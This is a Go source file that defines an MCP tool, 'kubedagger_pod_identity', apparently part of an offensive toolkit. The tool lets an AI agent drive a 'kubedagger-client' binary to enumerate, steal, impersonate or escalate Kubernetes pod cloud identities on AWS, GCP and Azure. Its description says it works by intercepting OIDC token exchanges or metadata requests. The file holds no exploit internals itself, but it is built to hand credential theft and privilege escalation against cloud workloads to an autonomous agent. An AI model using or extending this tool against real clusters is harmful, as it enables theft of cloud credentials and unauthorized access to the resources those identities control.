package kubedagger

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

type PodIdentityInput struct {
	Action    string `json:"action"`
	Pod       string `json:"pod,omitempty"`
	Namespace string `json:"namespace,omitempty"`
	Provider  string `json:"provider,omitempty"`
	Role      string `json:"role,omitempty"`
}

type PodIdentityTool struct {
	exec executor.Executor
}

func NewPodIdentity(exec executor.Executor) *PodIdentityTool {
	return &PodIdentityTool{exec: exec}
}

func (t *PodIdentityTool) Name() string { return "kubedagger_pod_identity" }

func (t *PodIdentityTool) Description() string {
	return "Steal or impersonate pod cloud identities (AWS IRSA, GCP Workload Identity, Azure Managed Identity). Intercepts OIDC token exchanges or metadata requests to assume the cloud IAM role bound to another pod."
}

func (t *PodIdentityTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"action": {
				"type": "string",
				"enum": ["enumerate", "steal", "impersonate", "escalate"],
				"description": "Pod identity operation"
			},
			"pod": {
				"type": "string",
				"description": "Target pod"
			},
			"namespace": {
				"type": "string",
				"description": "Target namespace"
			},
			"provider": {
				"type": "string",
				"enum": ["aws", "gcp", "azure", "auto"],
				"description": "Cloud provider"
			},
			"role": {
				"type": "string",
				"description": "Specific IAM role/identity to target"
			}
		},
		"required": ["action"]
	}`)
}

func (t *PodIdentityTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input PodIdentityInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateSafeString(input.Pod, "pod"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateNamespace(input.Namespace); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Role, "role"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"pod-identity", "--action", input.Action}
	if input.Pod != "" {
		args = append(args, "--pod", input.Pod)
	}
	if input.Namespace != "" {
		args = append(args, "--namespace", input.Namespace)
	}
	if input.Provider != "" {
		args = append(args, "--provider", input.Provider)
	}
	if input.Role != "" {
		args = append(args, "--role", input.Role)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger pod-identity failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	fmt.Fprintf(&sb, "## KubeDagger Pod Identity: %s\n\n", input.Action)
	if output == "" {
		sb.WriteString("No identities found.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}
